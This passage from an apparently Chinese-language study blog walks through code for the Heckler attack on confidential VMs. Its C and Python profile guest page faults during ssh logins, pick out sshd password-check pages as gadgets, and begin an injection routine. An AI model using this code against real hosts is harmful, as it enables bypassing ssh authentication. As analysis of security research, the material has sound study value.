class=\"line\">            <span class=\"keyword\">case</span> <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"comment\">//no error</span></span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>: &#123;</span><br><span class=\"line\">                pr_info(<span class=\"string\">&quot;usp_send_and_block: Failed in svm_vcpu_run with %d&quot;</span>, ret);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> PyObject* <span class=\"title function_\">heckler_block_until_event</span><span class=\"params\">(PyObject* self, PyObject* args)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> gpa;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (event_buffer != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;memory leak? freeing event_buffer\\n&quot;</span>);</span><br><span class=\"line\">\t\tfree_usp_event(event_type, event_buffer);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Do not block the GIL on block until event</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\tPy_BEGIN_ALLOW_THREADS</span><br><span class=\"line\">\t\tret = usp_block_until_event(&amp;ctx, &amp;event_type, &amp;event_buffer);</span><br><span class=\"line\">\tPy_END_ALLOW_THREADS</span><br><span class=\"line\">\t<span class=\"title function_\">if</span> <span class=\"params\">(ret == SEV_STEP_ERR_ABORT)</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tret = SEV_STEP_ERR_ABORT;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> end;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ret == SEV_STEP_ERR)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (event_type != PAGE_FAULT_EVENT)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s:%d : expected page fault event, got %d\\n&quot;</span>, __FILE__, __LINE__, event_type);</span><br><span class=\"line\">\t\t\tret = EXIT_CODE_ERR;</span><br><span class=\"line\">\t\t\t__clean_up();</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> end;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t<span class=\"type\">usp_page_fault_event_t</span>* pf_event = (<span class=\"type\">usp_page_fault_event_t</span>*)event_buffer;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (debug)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(BHGRN <span class=\"string\">&quot;Pagefault Event: &#123;GPA:0x%lx&#125;\\n&quot;</span>reset, pf_event-&gt;faulted_gpa);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tgpa = pf_event-&gt;faulted_gpa;</span><br><span class=\"line\">end:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ret != <span class=\"number\">0</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgpa = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> Py_BuildValue(<span class=\"string\">&quot;&#123;s:i,s:K&#125;&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;ret&quot;</span>, ret, <span class=\"string\">&quot;gpa&quot;</span>, gpa);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_track_once</span>(<span class=\"params\">self, boot,</span></span><br><span class=\"line\"><span class=\"params\">                    gpa_to_track=<span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">                    timeout_s=<span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">                    event_timeout=<span class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">                    wait_before_go=<span class=\"literal\">False</span></span>):</span><br><span class=\"line\">        self.do_page_tracking_ready = <span class=\"literal\">False</span></span><br><span class=\"line\">        self.do_page_tracking_stopped = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> wait_before_go:</span><br><span class=\"line\">            self.do_page_tracking = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            self.do_page_tracking = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        run_list = []</span><br><span class=\"line\">        run_set = OrderedSet()</span><br><span class=\"line\">        pfs = &#123;&#125;</span><br><span class=\"line\">        last_gpa = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">def</span> <span class=\"title function_\">th_timeout</span>():</span><br><span class=\"line\">            time.sleep(timeout_s)</span><br><span class=\"line\">            self.do_page_tracking = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        th = threading.Thread(target=th_timeout, args=[], daemon=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        h.heckler_init()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> timeout_s <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            th.start()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> boot:</span><br><span class=\"line\">            h.heckler_enable_boot_tracking()</span><br><span class=\"line\">            <span class=\"keyword\">assert</span> gpa_to_track <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(gpa_to_track) == <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            h.heckler_enable_tracking()</span><br><span class=\"line\">            h.heckler_untrack_all_pages()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> gpa_to_track <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> <span class=\"built_in\">len</span>(gpa_to_track) == <span class=\"number\">0</span>:</span><br><span class=\"line\">                h.heckler_track_all_pages()</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> gpa <span class=\"keyword\">in</span> gpa_to_track:</span><br><span class=\"line\">                    h.heckler_track_page(gpa)</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;marking <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(gpa_to_track)&#125;</span> pages&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        acked = <span class=\"literal\">True</span></span><br><span class=\"line\">        errors = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">        self.do_page_tracking_ready = <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> wait_before_go:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.do_page_tracking:</span><br><span class=\"line\">                <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> self.do_page_tracking:</span><br><span class=\"line\">                acked = <span class=\"literal\">False</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> event_timeout:</span><br><span class=\"line\">                    ev = h.heckler_block_until_event_timeout(<span class=\"number\">5</span>)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    ev = h.heckler_block_until_event()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ev <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> ev.get(<span class=\"string\">&#x27;ret&#x27;</span>) == <span class=\"number\">1</span> <span class=\"keyword\">or</span> ev.get(<span class=\"string\">&#x27;gpa&#x27;</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ev <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ev.get(<span class=\"string\">&#x27;ret&#x27;</span>) == h.HECKLER_ERR_ABORT:</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    errors = errors + <span class=\"number\">1</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> errors &gt; <span class=\"number\">300</span>:</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(ev)</span><br><span class=\"line\">                        <span class=\"built_in\">print</span>(errors)</span><br><span class=\"line\">                        <span class=\"keyword\">break</span></span><br><span class=\"line\">                    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                        h.heckler_ack_event()</span><br><span class=\"line\">                        acked = <span class=\"literal\">True</span></span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                gpa = <span class=\"built_in\">int</span>(ev.get(<span class=\"string\">&#x27;gpa&#x27;</span>))</span><br><span class=\"line\">                <span class=\"keyword\">if</span> gpa <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> pfs:</span><br><span class=\"line\">                    pfs[gpa] = <span class=\"number\">0</span></span><br><span class=\"line\">                pfs[gpa] += <span class=\"number\">1</span></span><br><span class=\"line\">                run_list.append(gpa)</span><br><span class=\"line\">                run_set.add(gpa)</span><br><span class=\"line\">                last_gpa = gpa</span><br><span class=\"line\"></span><br><span class=\"line\">                h.heckler_ack_event()</span><br><span class=\"line\">                acked = <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">except</span> KeyboardInterrupt <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> acked:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                h.heckler_ack_event()</span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(e)</span><br><span class=\"line\"></span><br><span class=\"line\">        self.do_page_tracking_stopped = <span class=\"literal\">True</span></span><br><span class=\"line\">        h.heckler_untrack_all_pages()</span><br><span class=\"line\">        h.heckler_clean_up()</span><br><span class=\"line\"></span><br><span class=\"line\">        pf_analysis = &#123;</span><br><span class=\"line\">            <span class=\"string\">&#x27;run_list&#x27;</span>: run_list,</span><br><span class=\"line\">            <span class=\"string\">&#x27;run_set&#x27;</span>: run_set,</span><br><span class=\"line\">            <span class=\"string\">&#x27;pfs&#x27;</span>: pfs,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        self.do_page_tracking = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> pf_analysis</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_do_profile</span>(<span class=\"params\">self,</span></span><br><span class=\"line\"><span class=\"params\">                do_trace,</span></span><br><span class=\"line\"><span class=\"params\">                include_set=<span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">                max_hit=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    self._kill_utility()</span><br><span class=\"line\">    ssh_conn = SshConnection()</span><br><span class=\"line\">    ssh_conn.prepare()</span><br><span class=\"line\">    ssh_conn.establish_connection_pw_wrong_once()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">do_handshake</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">nonlocal</span> ssh_conn</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.do_page_tracking_ready:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Doing ssh login...&quot;</span>)</span><br><span class=\"line\">        self.do_page_tracking = <span class=\"literal\">True</span></span><br><span class=\"line\">        ssh_conn.enter_password()</span><br><span class=\"line\">        self.do_page_tracking = <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    th_ssh_conn = threading.Thread(target=do_handshake,</span><br><span class=\"line\">                                   args=[self],</span><br><span class=\"line\">                                   daemon=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    th_ssh_conn.start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> do_trace:</span><br><span class=\"line\">        res = self._track_trace(include_set,</span><br><span class=\"line\">                                max_hit=max_hit,</span><br><span class=\"line\">                                wait_before_go=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        res = self._track_once(boot=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                               gpa_to_track=include_set,</span><br><span class=\"line\">                               event_timeout=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                               wait_before_go=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Waiting for tracking thread to join() (hit ctrl-c to quit)&quot;</span>)</span><br><span class=\"line\">    th_ssh_conn.join()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_do_trace</span>(<span class=\"params\">self,</span></span><br><span class=\"line\"><span class=\"params\">              include_set,</span></span><br><span class=\"line\"><span class=\"params\">              max_hit=<span class=\"number\">30</span></span>):</span><br><span class=\"line\">    trace_results = self._do_profile(<span class=\"literal\">True</span>, include_set=include_set, max_hit=max_hit)</span><br><span class=\"line\">    self._kill_utility()</span><br><span class=\"line\"></span><br><span class=\"line\">    run_list = trace_results[<span class=\"string\">&#x27;run_list&#x27;</span>]</span><br><span class=\"line\">    run_set = trace_results[<span class=\"string\">&#x27;run_set&#x27;</span>]</span><br><span class=\"line\">    self._dump(<span class=\"string\">&#x27;trace_results&#x27;</span>, trace_results)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> run_list, run_set</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">profile</span>(<span class=\"params\">self, include_set=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">    track_once_results = self._do_profile(<span class=\"literal\">False</span>, include_set=include_set)</span><br><span class=\"line\">    run_set = track_once_results[<span class=\"string\">&#x27;run_set&#x27;</span>]</span><br><span class=\"line\">    self._dump(<span class=\"string\">&#x27;track_once_results&#x27;</span>, track_once_results)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> run_set</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">trace</span>(<span class=\"params\">self, total_include_set, index=<span class=\"number\">0</span></span>):</span><br><span class=\"line\">    trace_list, run_set = self._do_trace(total_include_set)</span><br><span class=\"line\">    self._santiy_check(trace_list, <span class=\"string\">&quot;application trace&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    self._dump(<span class=\"string\">f&quot;trace_list_<span class=\"subst\">&#123;index&#125;</span>&quot;</span>, trace_list, force=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    self._dump(<span class=\"string\">&quot;run_set_latest&quot;</span>, trace_list, force=<span class=\"literal\">False</span>, time_suffix=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    self._dump(<span class=\"string\">&quot;ground_truth&quot;</span>,</span><br><span class=\"line\">               &#123;<span class=\"string\">&#x27;mm_answer_authpassword&#x27;</span>: self.page_sshd_mm_answer_authpassword,</span><br><span class=\"line\">                <span class=\"string\">&#x27;auth_password&#x27;</span>: self.page_sshd_auth_password&#125;, force=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> trace_list, run_set</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h3><p><strong>page set&#x2F;trace 记录的都是GPA</strong> 从page fault中拿到的GPA</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">total_include_set = OrderedSet()</span><br><span class=\"line\">total_exclude_set = OrderedSet()</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Boot set</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">console.rule(<span class=\"string\">&quot;Profiling Boot (S_Boot)&quot;</span>)</span><br><span class=\"line\">boot_set = self.boot()</span><br><span class=\"line\">total_exclude_set.update(boot_set)</span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Idle Execution</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">console.rule(<span class=\"string\">f&quot;Profiling idle execution&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Profiling <span class=\"subst\">&#123;i&#125;</span>...&quot;</span>)</span><br><span class=\"line\">    exclude = self._track_once(boot=<span class=\"literal\">False</span>, timeout_s=<span class=\"number\">5</span>)</span><br><span class=\"line\">    exclude_set = exclude[<span class=\"string\">&#x27;run_set&#x27;</span>]</span><br><span class=\"line\">    total_exclude_set.update(exclude_set)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Application Set</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Profiling ssh login attempt <span class=\"subst\">&#123;i + <span class=\"number\">1</span>&#125;</span> (S_App)&quot;</span>)</span><br><span class=\"line\">    include_set = self.profile(total_include_set)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(total_include_set) == <span class=\"number\">0</span>:</span><br><span class=\"line\">    \ttotal_include_set.update(include_set)</span><br><span class=\"line\">    \ttotal_include_set.difference_update(total_exclude_set)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">    \ttotal_include_set.intersection_update(include_set)</span><br><span class=\"line\">    \ttotal_include_set.difference_update(total_exclude_set)</span><br><span class=\"line\"></span><br><span class=\"line\">       </span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># Application Trace</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\">candidates = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">2</span>):</span><br><span class=\"line\">\tconsole.rule(<span class=\"string\">f&quot;Profiling application trace (<span class=\"subst\">&#123;i&#125;</span>)&quot;</span></span><br><span class=\"line\">\t<span class=\"string\">f&quot;(PT_App with |S_App|=<span class=\"subst\">&#123;<span class=\"built_in\">len</span>(total_include_set)&#125;</span>)&quot;</span>)</span><br><span class=\"line\">    self._sleep(<span class=\"number\">3</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    run_list, run_set = self.trace(total_include_set, i)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;Collected trace of <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(run_list)&#125;</span> pages (PT_App)&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    new_candidates = find_candidates(run_list,</span><br><span class=\"line\">    run_set,</span><br><span class=\"line\">    self.page_sshd_auth_password,</span><br><span class=\"line\">    self.page_sshd_mm_answer_authpassword,</span><br><span class=\"line\">    debug=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    candidates = self._filter_candidates(new_candidates,</span><br><span class=\"line\">    candidates,</span><br><span class=\"line\">    run_list,</span><br><span class=\"line\">    debug=<span class=\"literal\">False</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"构造gadget\"><a href=\"#构造gadget\" class=\"headerlink\" title=\"构造gadget\"></a>构造gadget</h3><p>最tricky的一步：如何在PTapp里找到Aseq？</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># <span class=\"doctag\">XXX:</span> this approach ignores the back jump from</span></span><br><span class=\"line\"><span class=\"comment\"># auth_password -&gt; mm_answer_authpassword and tries to find the gadgets</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># for some CVM, we do not find a direct backjump but a strange</span></span><br><span class=\"line\"><span class=\"comment\"># ping pong pattern of auth_password and some other page even though the backjump</span></span><br><span class=\"line\"><span class=\"comment\"># should only be occurring once in a perfect trace sequence</span></span><br><span class=\"line\"><span class=\"comment\"># mm_answer_authpassword -&gt; auth_password .... backjump: auth_password -&gt; mm_answer_authpassword.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># instead, auth_password ping pongs with some other page until max_hit is reached.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"comment\"># this is puzzling and may be caused by spurious page faults</span></span><br><span class=\"line\"><span class=\"comment\"># this function is a workaround and tries to find gadget page with no distinct</span></span><br><span class=\"line\"><span class=\"comment\"># auth_password -&gt; mm_answer_authpassword backjump.</span></span><br><span class=\"line\"><span class=\"comment\">#</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">_find_no_direct_backjump</span>(<span class=\"params\">run_list, run_set,</span></span><br><span class=\"line\"><span class=\"params\">                            gt_auth_password,</span></span><br><span class=\"line\"><span class=\"params\">                            gt_mm_answer_authpassword,</span></span><br><span class=\"line\"><span class=\"params\">                            debug=<span class=\"literal\">False</span></span>):</span><br><span class=\"line\">    auth_password_list = []</span><br><span class=\"line\">    mm_answer_authpassword_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> addr <span class=\"keyword\">in</span> run_set:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"number\">6</span> &lt;= run_list.count(addr) &lt;= <span class=\"number\">9</span>:</span><br><span class=\"line\">            mm_answer_authpassword_list.append(addr)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"number\">30</span> &lt;= run_list.count(addr) &lt;= <span class=\"number\">30</span>:</span><br><span class=\"line\">            auth_password_list.append(addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> debug:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;no direct: auth_password_list: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(auth_password_list)&#125;</span>&quot;</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">f&quot;no direct: mm_answer_authpassword_list: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(mm_answer_authpassword_list)&#125;</span>&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    candidates = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> auth_password <span class=\"keyword\">in</span> auth_password_list:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> mm_answer_authpassword <span class=\"keyword\">in</span> mm_answer_authpassword_list:</span><br><span class=\"line\">            num_found = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span> auth_password == mm_answer_authpassword:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(run_list) - <span class=\"number\">1</span>):</span><br><span class=\"line\">                <span class=\"comment\"># mm_anser_authpasswd -&gt; auth_pwd .... mm_anser_authpasswd</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> run_list[i] == mm_answer_authpassword <span class=\"keyword\">and</span> \\</span><br><span class=\"line\">                        run_list[i + <span class=\"number\">1</span>] == auth_password:</span><br><span class=\"line\">                    <span class=\"comment\"># first auth_password in list</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> run_list[:i + <span class=\"number\">1</span>].count(auth_password) == <span class=\"number\">0</span>:</span><br><span class=\"line\">                        j = i + <span class=\"number\">1</span></span><br><span class=\"line\">                        <span class=\"keyword\">while</span> j &lt; <span class=\"built_in\">len</span>(run_list):</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> run_list[j] == mm_answer_authpassword:</span><br><span class=\"line\">                                num_found += <span class=\"number\">1</span></span><br><span class=\"line\">                                <span class=\"keyword\">break</span></span><br><span class=\"line\">                            j = j + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># combination must be unique</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> num_found == <span class=\"number\">1</span>:</span><br><span class=\"line\">                candidates.append((mm_answer_authpassword, auth_password))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> candidates</span><br></pre></td></tr></table></figure>\n\n<p>runlist里面出现6-9次的gpa是mm_answer_authpassword备选 30次是auth_password备选</p>\n<p>互相组合 需要满足mm_anser_authpasswd -&gt; auth_pwd …. mm_anser_authpasswd  即可</p>\n<p>看起来不是特别靠谱 但是可以多跑几次取交集</p>\n<h3 id=\"inject\"><a href=\"#inject\" class=\"headerlink\" title=\"inject\"></a>inject</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inject</span>(<span class=\"params\">self, gadget_pairs, quit_after_one_inject=<span class=\"literal\">True</span></span>):</span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">        gadget_pairs: (mm_answer_authpassword, auth_password)</span></span><br><span class=\"line\"><span class=\"string\">        &quot;&quot;&quot;</span></span><br><span class=\"line\">        self.do_page_tracking = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\">        lastlast_gpa = <span class=\"number\">0</span></span><br><span class=\"line\">        last_gpa = <span class=\"number\">0</span></span><br><span class=\"line\">        h.heckler_init()</span><br><span class=\"line\"></span><br><span class=\"line\">        h.heckler_enable_tracking()</span><br><span class=\"line\">        h.heckler_untrack_all_pages()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> gadgets <span class=\"keyword\">in</span> gadget_pairs:</span><br><span class=\"line\">            gad1 = gadgets[<span class=\"number\">0</span>]</span><br><span class=\"line\">            gad2 = gadgets[<span class=\"number\">1</span>]</span><br><span class=\"line\">            h.heckler_track_page(gad1)</span><br><span class=\"line\">            h.heckler_track_page(gad2)</span><br><span class=\"line\"></span><br><span class=\"line\">        history = &#123;&#125;</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Attack active. Waiting for target gadgets...&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        acked = <span class=\"literal\">True</span></span><br><span class=\"line\">        errors = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            <span class=\"keyword\">while</span> self.do_page_tracking:</span><br><span class=\"line\">                acked = <span class=\"literal\">False</span></span><br><span class=\"line\">                ev = h.heckler_block_until_event()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> ev <span class=\"keyword\">is</span> <span class=\"literal\">None</span> <span class=\"keyword\">or</span> ev.get(<span class=\"string\">&#x27;ret&#x27;</span>) == <span class=\"number\">1</span> <span class=\"keyword\">or</span> ev.get(<span class=\"string\">&#x27;gpa&#x27;</span>) == <span class=\"number\">0</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> ev <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> ev.get(<span class=\"string\">&#x27;ret&#x27;</span>) == h.HECKLER_ERR_ABORT:</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    errors = errors + <span class=\"number\">1</span></span><br><span class=\"line\">                    <span 